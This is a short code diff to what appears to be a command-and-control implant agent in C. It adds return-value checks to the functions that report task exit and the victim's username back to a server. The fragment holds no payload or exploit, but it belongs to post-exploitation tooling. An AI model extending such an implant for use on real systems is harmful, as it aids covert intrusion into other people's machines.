@@ -31,10 +31,10 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	if (task != NULL) {
 		TaskPostReply reply = { 0 };
-		perform_post(state, task, &reply, "", "success");
+		BOOL result = perform_post(state, task, &reply, "", "success");
 		
 		#ifdef CELEBI_DEBUG
-		if (reply.success == 1) {
+		if (result == TRUE && reply.success == 1) {
 			dprintf("Server acknowledged exit.");
 		}
 		#endif
@@ -54,15 +54,16 @@ void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	char *username = cap->GetuidPicoEntrypoint();
 	
+	BOOL result;
 	TaskPostReply reply = { 0 };
 	if (username != NULL) {
-		perform_post(state, task, &reply, username, "success");
+		result = perform_post(state, task, &reply, username, "success");
 	} else {
-		perform_post(state, task, &reply, "<UNKNOWN>", "success");
+		result = perform_post(state, task, &reply, "<UNKNOWN>", "success");
 	}
 	
 	#ifdef CELEBI_DEBUG
-	if (reply.success == 1) {
+	if (result == TRUE && reply.success == 1) {
 		dprintf("Server acknowledged getuid output.");
 	}
 	#endif
